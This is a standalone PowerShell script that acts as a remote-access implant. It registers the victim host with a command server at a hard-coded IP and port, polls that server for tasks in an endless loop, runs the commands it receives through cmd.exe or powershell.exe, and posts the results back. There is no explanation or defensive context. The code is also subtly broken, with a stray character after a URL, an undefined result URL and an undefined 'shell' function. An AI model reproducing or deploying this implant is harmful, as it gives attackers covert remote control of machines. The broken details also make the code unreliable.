$ip   = "192.168.100.127"
$port = "1234"
$n    = 3
$name = ""

$host_name = [System.Net.Dns]::GetHostName()
$type  = "PowerShell"
$remote_ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress
$regl  = ("http" + ':' + "//$ip" + ':' + "$port/agents")
$data  = @{
    name = "$host_name"
    type = "$type"
    remote_ip = "$remote_ip"
    }
$name  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POST').Content
$taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name")1

for (;;){

    $task  = (Invoke-WebRequest -UseBasicParsing -Uri $taskl -Method 'GET').Content

    if (-Not [string]::IsNullOrEmpty($task)){

        $task = $task.split()
        $flag = $task[0]

        if ($flag -eq "VALID"){

            $command = $task[1]
            $args    = $task[2..$task.Length]

            if ($command -eq "shell"){

                $f    = "cmd.exe"
                $arg  = "/c "

                foreach ($a in $args){ $arg += $a + " " }

                $res  = shell $f $arg
                $data = @{result = "$res"}

                Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'

            }
            elseif ($command -eq "powershell"){

                $f    = "powershell.exe"
                $arg  = "/c "

                foreach ($a in $args){ $arg += $a + " " }

                $res  = shell $f $arg
                $data = @{result = "$res"}

                Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'

            }
        }

    sleep $n
    }
}
